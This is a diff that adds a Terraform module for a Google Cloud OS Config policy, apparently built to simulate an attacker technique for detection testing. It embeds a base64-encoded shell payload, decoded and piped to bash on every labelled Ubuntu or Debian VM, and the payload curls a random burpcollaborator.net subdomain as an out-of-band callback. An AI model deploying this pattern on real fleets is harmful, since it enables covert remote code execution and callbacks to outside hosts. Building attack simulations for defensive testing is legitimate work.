@@ -1,0 +1,78 @@
+locals {
+    oast_domain = "burpcollaborator.net"
+    payload = <<-EOT
+    LOGFILE=/tmp/osconfig_attacker_connect_oast_host.log
+    function log {
+        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
+        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
+    }
+    truncate -s 0 $LOGFILE
+    OAST_URL="https://$(cat /dev/urandom | tr -dc '[:lower:]' | fold -w $${1:-16} | head -n 1).${local.oast_domain}"
+    log "http request: $OAST_URL"
+    curl -s "$OAST_URL" >> $LOGFILE 2>&1
+    log "done"
+    EOT
+    base64_payload = base64encode(local.payload)
+}
+
+data "google_compute_zones" "available" {
+  project     = var.gcp_project_id
+  region    = var.gcp_location
+}
+
+resource "google_os_config_os_policy_assignment" "osconfig-connect-oast" {
+
+  project     = var.gcp_project_id
+  location    = data.google_compute_zones.available.names[0]
+  
+  name        = "osconfig-connect-oast-${var.environment}-${var.deployment}"
+  description = "Connect oast"
+  skip_await_rollout = true
+  
+  instance_filter {
+    all = false
+
+    inclusion_labels {
+      labels = var.label
+    }
+
+    inventories {
+      os_short_name = "ubuntu"
+    }
+
+    inventories {
+      os_short_name = "debian"
+    }
+
+  }
+
+  os_policies {
+    id   = "osconfig-connect-oast-${var.environment}-${var.deployment}"
+    mode = "ENFORCEMENT"
+
+    resource_groups {
+      resources {
+        id = "run"
+        exec {
+          validate {
+            interpreter      = "SHELL"
+            output_file_path = "$HOME/os-policy-tf.out"
+            script           = "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash - && exit 100"
+          }
+          enforce {
+            interpreter      = "SHELL"
+            output_file_path = "$HOME/os-policy-tf.out"
+            script           = "exit 100"
+          }
+        }
+      }
+    }
+  }
+
+  rollout {
+    disruption_budget {
+      percent = 100
+    }
+    min_wait_duration = "600s"
+  }
+}
